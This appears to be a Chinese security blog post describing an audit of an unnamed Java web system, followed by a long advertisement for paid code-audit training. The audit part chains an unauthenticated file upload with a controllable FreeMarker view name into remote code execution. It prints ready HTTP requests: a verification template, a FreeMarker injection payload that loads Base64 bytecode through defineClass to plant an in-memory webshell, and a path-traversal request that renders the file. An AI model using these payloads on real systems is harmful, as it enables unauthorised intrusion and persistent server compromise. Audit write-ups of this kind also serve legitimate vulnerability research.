#  某JAVA系统RCE漏洞审计流程  
 进击安全   2026-04-22 13:52  
  
前言：该文章为去年的库存，一直懒得没有发，现在源码给到ai都能审出来，时代发展太快，我们都是旧时代的产物了。  
# 一、信息收集  
## 1.1 github 搜索文件  
  
直接搜索网站的css或者js文件，发现有完全一模一样的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpRHpW2VT1W3uHytYiaCe87gyGjrF18eHvcFibhrq0NgQJRw3o3RNUd9cjzZL4TQ0V0kUQqSl4AvbIKtXick3ciaiabRJQLIMm4moqc/640?wx_fmt=png&from=appmsg "")  
## 1.2 github 搜索域名  
  
在加上主域名  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpP2qgmib5kGHz9HgosdcShruUFibJqlwvjn21gVXAb4KrOP8iad0Ng0twHxaxbnFHJdwIaSDqwW99wGNgmpmkibzT3up2VIw8QLRw/640?wx_fmt=png&from=appmsg "")  
  
# 二、模板注入（组合拳）  
## 2.1 查看配置文件  
  
这里查看application.yml  
```
freemarker:    template-loader-path: classpath:/webapp/    suffix: .html    request-context-attribute: request    allow-request-override: true  cache: false  check-template-location: true  charset: UTF-8    content-type: text/html    expose-request-attributes: true  expose-session-attributes: true  expose-spring-macro-helpers: true  allow-session-override: true  settings:        tag_syntax: auto_detect        template_update_delay: 1        default_encoding: UTF-8        output_encoding: UTF-8        locale: zh_CN        date_format: yyyy-MM-dd        time_format: HH:mm:ss        datetime_format: yyyy-MM-dd HH:mm:ss        auto_import:         number_format: 0.##        classic_compatible: true      template_exception_handler: com.tjsj.fwk.mvc.interceptors.FreemarkerExceptionHandler
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabrFAaJmGsiaavwT2SI61OC65Frqe9d2PP5enbyALibbNYl0dibMcVSD5Nra2jkaHvhwDC9ic6S279LKpxiblv1F4iaVTiczC8iaXia0fXTI/640?wx_fmt=png&from=appmsg "")  
  
解释一下FreeMarker 查找路径  
```
freemarker:    template-loader-path: classpath:/webapp/    suffix: .html基础路径: classpath:/webapp/+ 视图名: "templates/domain/zh_CN/pc//xx" + 后缀: ".html"= classpath:/webapp/templates/domain/zh_CN/pc//xx.html示例：视图名 "index"     → classpath:/webapp/index.html视图名 "user/list" → classpath:/webapp/user/list.html
```  
  
所以这里如果把suffix: .html  
改成ftl  
后缀，而我们上传的文件是html  
后缀，他也不会执行模板内容，因为他最终的路径是.ftl  
后缀  
```
基础路径: classpath:/webapp/+ 视图名: "templates/domain/zh_CN/pc//xx" + 后缀: ".ftl"= classpath:/webapp/templates/domain/zh_CN/pc//xx.ftl
```  
  
并且FreeMarker  
只在特定情况下激活  
```
FreeMarker 执行的条件：- 通过 ModelAndView 或视图名返回- 经过配置的 FreeMarkerViewResolver- 在 template-loader-path 指定的目录中
```  
  
解释下ModelAndView  
作用，他是制定渲染视图名的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabpNXeMZYUv8EYGPmBOqnibYiaRD2w0JNPJSibFBpE2RSoIKGk8rsj9nr4OKfTlIOMPuK5AR1sQ387FOdic2C2tfHAIuaoY2JKWLupU/640?wx_fmt=png&from=appmsg "")  
## 2.2 文件上传  
### 2.2.1 uploadImgByAccessoryWithWeb  
  
这里规定用post  
请求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabql3B66szoOKsRg1QAJXkbPvr41x6022VUiaKGiaetEnDriblibliafP93icE0BCuMvyiabaL6TbkTzVgDUUwoCNwrGN0xtPicM4kREMzg/640?wx_fmt=png&from=appmsg "")  
  
url的逻辑  
```
#定义uploadFilePath路径String uploadFilePath = "accessory";  #定义url路径：/accessory/xxxxx-xxx/#这里的File.separator是/DateFormat sdf = new SimpleDateFormat("yyyy-MM-dd"); String uri = uploadFilePath + File.separator +sdf.format(new Date())+ File.separator;  #之后判断有没有type参数，如果没有就url为:/accessory/xxxxx-xxx/publish/if(StringUtils.isNotBlank(request.getParameter("type"))&&request.getParameter("type").equals("client")){      uri += "client" +  File.separator;  }else{      uri += "publish" +  File.separator;  }  #这里就判断域名是否为空，然后url：/accessory/xxxxx-xxx/publish/域名/uri += request.getServerName()==null?"default":request.getServerName() + File.separator;
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpJSpAfyx5lGXgSXibPzVhPvibqXXQYUaFVBsKO2tfHyickMp8Qf05j6sxwBHgZs4QBtiaOnoVLpVnOI5E93JY3BIekW5QRHpQWtNc/640?wx_fmt=png&from=appmsg "")  
  
然后看下面代码  
```
getRealRootPath函数：返回/webapp/    这个路径
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabqyVysZGia7BrjLKwlbNWKYPLPtYMcMycWPlhIMW8ibqVKutQWKvZ144j8ib6CF5gFST5aKCpB0Nias2TnficjuONXBlcpTyMoX25Tw/640?wx_fmt=png&from=appmsg "")  
  
  
转入到saveFileToServer  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabokp7CculQZbS6rSCmkLUYU5pZmqPP4Yw8cNibbLYRth6HRmsT6yj6myxQ76vmVDK2YmxN7x23MgYu8rIBKw4ibAPicc1J4H1nzSI/640?wx_fmt=png&from=appmsg "")  
  
  
之后就正常的上传文件，路径为/webapp/accessory/xxxxx-xxx/publish/域名/xxxx-xxxx.jsp  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqCoaML8eIK5VUw5QXFMqap0Z1bC6FkyeDcIPIYMNcuCcVxRNSuK4oW3bXIiahDI4DtGSznbyAbr51PkeicD2jfQeMZl4ibaqsj5k/640?wx_fmt=png&from=appmsg "")  
  
## 2.3 模板渲染  
  
之前说了ModelAndView  
这个函数是渲染模板的，那我上传一个html  
后缀的freemarker  
语法的内容，应该要用这个函数去渲染。 全局搜索ModelAndView  
，发现有两个函数createView  
和createBgView  
，其中viewName  
是可控的状态  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabqrk40yhRe5HrgUQd1xLiafs7fDpLcZZ2AlIUlxQdrC0AoGUy8UVg29yiayxym0l9y2A0iaLaUCG0icL4gt4H3ibPD6JfqnUEK9zjKc/640?wx_fmt=png&from=appmsg "")  
  
之后全局搜索两个函数createView  
和createBgView  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNabr17c2ycIsdjtflj47VlYP1C0JpBPD3nqicE2ZM7Ul8gFd35ia4YCUia13H1ibvfQvYtFiayKicDdB09w9icha0DkJ2ia7IhX1lialf1svc/640?wx_fmt=png&from=appmsg "")  
  
  
其中发现一下路径无权限，且路径可控  
```
detailscolumnDetailsdetailsscolumn_article_list_by_idqueryByConditionobtain_like_article_by_titleobtain_article_by_columnobtain_recruit_articleobtain_column_children_by_iduser/logoutvideolistobtain_comment_listobtain_comment_list_likeobtain_order_listobtain_order_list_likeobtain_question_by_idobtain_question_by_keywordobtain_question_listobtain_answer_by_keywordobtain_recritment_listobtain_recruit_list_likeinfo/query_infoobtain_small_content_list_likeobtain_small_content_by_id
```  
  
文件上传验证模板注入漏洞  
```
POST x HTTP/1.1Host: xAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brCookie: HttpOnly; xConnection: keep-aliveContent-Type: multipart/form-data; boundary=----WebKitFormBoundary0vhwQhJtQDJWce7DContent-Length: 180------WebKitFormBoundary0vhwQhJtQDJWce7DContent-Disposition: form-data; name="files"; filename="1.html"Content-Type: image/jpeg<!DOCTYPE html><html><head><title>漏洞验证</title></head><body><h1>🔓 FreeMarker 模板注入验证</h1><div><h3>系统信息:</h3><p><strong>FreeMarker 版本:</strong> ${.version}</p><p><strong>当前环境:</strong> ${.now?string("yyyy-MM-dd HH:mm:ss")}</p><p><strong>时间戳:</strong> ${.now?long}</p><p><strong>输出编码:</strong> ${.output_encoding!"UTF-8"}</p></div><div style="background: #d4edda; padding: 15px; margin: 20px 0; border-radius: 5px;"><h2 style="color: #155724;">✅ 漏洞验证成功</h2><p>FreeMarker 模板注入漏洞存在！</p><p>当前时间: <strong>${.now?string("HH:mm:ss")}</strong></p></div><footer><p>测试时间: ${.now?string("yyyy年MM月dd日 HH时mm分ss秒")}</p></footer></body></html>------WebKitFormBoundary0vhwQhJtQDJWce7D
```  
  
之后在上传一个模板注入的内存马  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iauwNHkmNaboibMe9cHPxCJeYApJj4jG6tHQYMB6BD3fmC5OArMKZVtkM63NCTyic2sjE3a6dLKXyFODHDT4uWVXLAibSbicrG6ydwYFdOkkzY0E/640?wx_fmt=png&from=appmsg "")  
  
```
POST /upload/uploadImgByWebAccessory.htm HTTP/1.1Host: xAccept-Language: zh-CN,zh;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brCookie: HttpOnly; xConnection: keep-aliveContent-Type: multipart/form-data; boundary=----WebKitFormBoundary0vhwQhJtQDJWce7DContent-Length: 180------WebKitFormBoundary0vhwQhJtQDJWce7DContent-Disposition: form-data; name="files"; filename="1.html"Content-Type: image/jpeg<!DOCTYPE html><html><head><title>示例页面</title></head><body><h1>${message}${"freemarker.template.utility.ObjectConstructor"?new()("javax.script.ScriptEngineManager").getEngineByName("js").eval("var classLoader = java.lang.Thread.currentThread().getContextClassLoader();try{classLoader.loadClass('注入器类名').newInstance();}catch (e){var clsString = classLoader.loadClass('java.lang.String');var bytecodeBase64 = 'Base加密的代码';var bytecode;try{var clsBase64 = classLoader.loadClass('java.util.Base64');var clsDecoder = classLoader.loadClass('java.util.Base64$Decoder');var decoder = clsBase64.getMethod('getDecoder').invoke(base64Clz);bytecode = clsDecoder.getMethod('decode', clsString).invoke(decoder, bytecodeBase64);} catch (ee) {try {var datatypeConverterClz = classLoader.loadClass('javax.xml.bind.DatatypeConverter');bytecode = datatypeConverterClz.getMethod('parseBase64Binary', clsString).invoke(datatypeConverterClz, bytecodeBase64);} catch (eee) {var clazz1 = classLoader.loadClass('sun.misc.BASE64Decoder');bytecode = clazz1.newInstance().decodeBuffer(bytecodeBase64);}}var clsClassLoader = classLoader.loadClass('java.lang.ClassLoader');var clsByteArray = (new java.lang.String('a').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod('defineClass', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();}")}</h1><p>当前用户数：${userCount}</p><!-- 如果message变量不存在，使用默认值 --><p>备用消息：${message!"默认消息"}</p></body></html>------WebKitFormBoundary0vhwQhJtQDJWce7D
```  
  
之后在访问路径渲染模板  
  
![](https://mmbiz.qpic.cn/mmbiz_png/iauwNHkmNabpLECRxqsHqiadibyZAj9wDIN3FXrxKUVHy4DhfGdiadibibmllgnF4m7WnGzfH6hUN6dhnnJChmNolv99cPUSBwPlYFR9mOibdpOJss/640?wx_fmt=png&from=appmsg "")  
  
```
POST /{{file:line(/Users/qq/yakit-projects/temp/tmp2970083007.txt)}} HTTP/1.1Host:xCookie:x; Path=/Sec-Ch-Ua-Platform: "macOS"Accept-Language: zh-CN,zh;q=0.9Sec-Ch-Ua: "Not.A/Brand";v="99", "Chromium";v="136"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Sec-Ch-Ua-Mobile: ?0Accept: */*Sec-Fetch-Site: same-originSec-Fetch-Mode: no-corsSec-Fetch-Dest: scriptAccept-Encoding: gzip, deflate, brPriority: u=1Content-Type: application/x-www-form-urlencodedContent-Length: 97url=../../../accessory/x/publish/x/94746e9e-a264-46b9-b72e-a50216e7f635
```  
  
  
**代码审计培训介绍&广告区域**  
  
  
             历经四期培训，终于迎来了代码审计第五期培训，本次培训依旧一次报名一直可听，并且富含前面四期课程均可以听，先来看看之前的培训都有哪些内容，这里我给大家截屏看看。  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/HBLcNkZ8PQddO5DZYzH4GcwlsOwEK5cR1A5XZuWXTP3ib3tWpcAtuLUaliasnZQvBmenGd0UNicFQOsJGyIzodicicg/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=0 "")  
  
一、往期-第四期课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/dJGuszYr5iaRGiaZURAxJAROibCh1sjaZictcbC4iasuuOgCMQSDSwrG5Wfrx2QgfvKx8icDhm0gIia8fN6mThehEK8ww/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1 "")  
  
###       
  
  
###     我们先来看看上一期课程内容，内容如下，给各位师傅们讲解上一期课程讲解了哪些内容，包括相关的学员出货记录，以及部分课件内容。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
往期-第四期基础课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSheicCpgNia72ibvHGIqlXVcakqKvXqSxVYm62sfoYKIQYZV2FcTR5UPOSPIXXkVKzdvwia63juVGK2WyoT5S5dfoVVkeXRNlRps8/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
此为第四期基础课程，共计授课四十次，此外第四期相较于第三期新增了APP、小程序、WEB逆向，同时主线仍然在代码审计上面，其中基础课程主要目的为：  
  
掌握代码审计思路、完成0-1、能够独立开始审计项目  
。  
  
讲解方向如下：  
  
  
✅ NET代码审计  
✅ APP、小程序、WEB逆向  
  
✅ JAVA代码审计  
  
  
（当然个人认为讲的最好的是JAVA代码审计，而且此次代码审计偏向0-1的实现，更多的是讲解完漏洞原理之后小朋友带着进行实战代码审计，分析各个项目，从理论→实践的演变，当然小朋友们每个课程都是这种方式。）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=7 "")  
  
往期-第四期  
进阶课程  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=8 "")  
  
  
  
###   
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSupoJr1P3Uubr6QGvIQPN1vcHAKQUMibicXkOg6lr6wiaU0QIg0PuAZt3zeiaj5ibBWcicZ7T9JV8pT097j8FLGyZClfrL4q8HGZSCY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=9 "")  
  
  
    为什么在第四期课程分为了基础课程以及进阶课程，就是因为发现学员大部分都是为了审计而去审计，单一的去使用某一个方法审计漏洞，而不会进行漏洞的组合拳，扩大危害，  
**虽然自己都是实战案例，但是发现学员都是跟着案例当中的漏洞去套用在了自己的源码\项目当中**  
。  
  
所以开启了第四期进阶代码审计课程，课程目的主要为：  
  
  
✅   
深入理解鉴权  
  
✅   
漏洞组合拳扩大危害  
  
✅   
尝试0-1贴合多数学员完成前台RCE出货  
  
  
（本次授课累计20余次，专项针对以上目的，大量分析鉴权&绕过、组合拳利用、前台RCE）  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=10 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=11 "")  
  
往期-第四期-部分学员报喜&课件  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=12 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQk0wpSlvv5ibNDvAtdxAc1uPBlVmYz3PMByqticicdcf4fXHaLrV7Puk1P4iaLUoB9JKicd0NB7geeOnCAukFiblI9zo0sTlxIg0cBw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=13 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQyKwGibiapuoicRS1GppriaSgibQ1GW22Ch4WeM9VSVwM1pf2LBGRAweLqgJicvgxfIPIsnyY91S5JOsfZQeVsSDnO987mCgGX3O4D4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=18 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQb4qMyhmeHXTiaJIMsF4sf7TwJQAtBSdXNGIUkBYaBoqcGXAiaroaiaYrSvptpYmiaF23u2moOOuGA1lgSBkibOPcg7M54o4aUvLEw/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=20 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/G4zicxKmtXXhicvpUX9R0fxBOic1XNQdlPRrh27zNXQlQ9UYKWLzvZvPYqu3licIgC4v7j1ArN4vfJjoxp4MgTvFmA/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=25 "")  
  
上下滑动查看更多  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Pu52Sn0jPu0EbVUSia7W7sUxTVicmhGmYTkl23iaZv7FdOTQE7bh7lb3gMR7hqLULFpHDq5UyDClYpOMAgnLljB2w/640?from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=26 "")  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTaHQby7Z8lLptxmb37KGCOvUrEKMcPcE93xvLWtOoLhSbKKvyZXUPf45jPG9VQwll6rEXAotUc0IE6HUdm3oH0fzssr46akro/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=27 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTTCa70fPiarwXFspnuibkj557OGALhWgPg44njBp41mP0FXLBFNqd71hvia7kL2X6Mliay2g0mI2RzNxFZMC1PAurs1uHvj1D7PZI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=28 "")  
  
  
  
  
  
  
  
  
  
**左右滑动查看更多**  
  
**>**  
  
    那么可能会有师傅提问，为什么没有PHP呢，其实PHP也是有讲解的，只不过大部分是直接的案例，基础的PHP代码审计函数以及基础等，均放在了第三期课程当中。  
  
（部分课件）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQzFzyMiazr1DSVz2q2vH9Pz8DRfSvkoRgH6VMTSAtso843wWGC7cibwzwcyzIpUfiaCjhjvuew7Qd1ZKaMKqriaZjGugxLAIaADsk/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=45 "")  
  
    这也是为什么有的学员在报名之后，我会给他规划学习路线，先看xxx在看xxx，这些都是小朋友认为哪一期的那些内容讲的不错，然后给兄弟们总结出来的优质学习路线。  
  
那么接下来我们可以看看小朋友在做了四期培训之后  
学员出货报喜时刻：  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/HD0HxvpnwC5ZeImfWYKsmFnrQxS8uec0lgeqCdbhfrzK5af1GicN0VznKVcCJFJwfqDVFIopkWP0OQxia5Y2Fj7g/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=46 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/vjKYWs9y65W5n4PxYWtJKL6NFQ5b33EDmVhhibZ7XqTbzFP6AKT75NO9ruuOia5WEJlbCukAFpHGbhicHv0elprLg/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=47 "")  
  
往期-学员报喜时刻（部分）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/byR65XibZJfW0aVCxh4yatvn7mHPias6u1M2xpeaYD31jyyrHgz550eWgUu6O2KFmah7jZVsyceicfXzRh2nR2pyA/640?&wx_fmt=png&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=48 "")  
  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTWghKPU8RCEUglFN02tZp9tic3cc4Sj6W4g5VIiaGSIIyqWXe1U3jz7vsjEe4TJUMZ7Rw7GZiaiautO737t051OiaWse5yWV61EjN8/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=49 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRJJ5nteHtgMtSFknpbluDwBl7ja7iad5Chzft5dc5VfqsHduhozXaSNdiapsB5gBxUEO5eSibf0JRM3PYlFXl3qw6kibpadElrVlA/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=50 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kS4PlxwTicianlGOhkpWkl53fOpzfp8CYwHicDXch9YObKbiauxBwGMPBKs2hBAcochq4Tic6XiaHEOoNInUKq4ASNs6wWpEz98Ekbt4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=51 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTupf2mOqpLGZAppPvvicu1k8lw4kwCwUL8bGSg1MxPpHmAX7SicR2gI9FyNdYQvbcw7qQ9e7LeVVEbArWPbezWNg1DdbGx1QE7Q/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=52 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSvnszLOhvgKmZsM1qBYIT6icuaptkX9Q7rdMZmpMTtsKWIDrY46v45gkRWDuG3HlibYfVXDNjAZnCiafrPRn3CtGppXx1ibAbwREY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=53 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTqibV5UElYSp0GX5ic6mYLNtXWqMiaZ940LdPBHhux3Hicg97xiafu1jtLnJMbCsAYAFVlOETvicYFmJjmzfVmDL9XDictFC6CSCb2ls/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=54 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kThiaRgnbiacPLKu9xSeepICG8rXWsCX38lp7RZd6hlskeXJ8gtUtHggciazCtrb5dLkauGJ7wibauIP2rPlJM0ssj73Sb9cAMGgg0/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=55 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSAArR8xViad5OXxdbwkV0V9rFes7N66h0Yqc5Xv7rEM3MsP0NzEMibjhpx2EQap6tJCKPkscqq7CH1nSX96KUCNGbWzIu14DQeo/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=56 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kRGVDL5BfeWKN4iaERHibMT1WXGZkTEV7c2INGaqecj3Guqb7HAR7DSn2nVibtwmRFIEdPib9HJEuTXYA6fMAGYtrtm7ECjZataJac/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=57 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kQqDiaibSGkAicD98Fo1jl7SpqSUic6CPx1h5rBGhQogic4x34VNWV4dZhcoBH7oMeSQ7WicgiaUkicPMibZ45EooU5E9W1YIPNWDweXnLs/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=58 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTMoZBTPTY1FGzSiaX6jjq1hpX3hwG1CW61tDUwINN96UOiaLSJFQ9OL8ojmsX8IMUCwuSLII1YhpiaMQG8JHtgqQ2JLnzT2fwHy4/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=59 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kQVTDtgoky505wJBsBeprDzMTYLlAH4XtZOxz5UsYicJnqudL4afwsTy8BdVjg9K7eHm2IovD2dPRBn0KfoaykhSp0ufGda65kg/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=60 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Dfrm5V3o6kQeptSf8bMuIWzTWxDaCmq1NN524FueKWic8KGOnIyAicqbOSGFpia8wIwc17D16CIxmGNA5mFiaw8iadCophaNCiccnfrv9ttssQnBE/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=61 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kSib2DmsbOqaaTdxEzhphR24icCv5rbzmqJIQtH504zsicDtqLZSejsmBwQ8fQuCDaic59Nr0OzDR6Iibfztw5ZicHnOq9UAaht8mibMY/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=62 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/Dfrm5V3o6kTZWWvqGbicicAicTLjTEP1uPfstWPDwXSiaefLicU9rYjgJY2iaL39XXhjzNtgnZGgboe8faZUWC1wKAibRo0uKPBKibnWpoO1NDztOAE/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=63 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Dfrm5V3o6kTeHHNVsW0EDjz2TqgOQp9YECULiabxz4BFoga5unOEuyC3K0juTXz3wKLmUDrYjMq7IQnjF3OV9eia5dJicTPDlCG9NwbpWjtK7g/640?wx_fmt=jpeg&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=64 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/Dfrm5V3o6kTERslK6icy6dKmsYlKiaQ8C6D5n79gVX8JVIxiabKtmY4b02Z7icJtWn4poBSibfGHHJlMgZqER2PQFqo0qicOC7FeFwTPpo4jkdYeI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=65 "")  
  
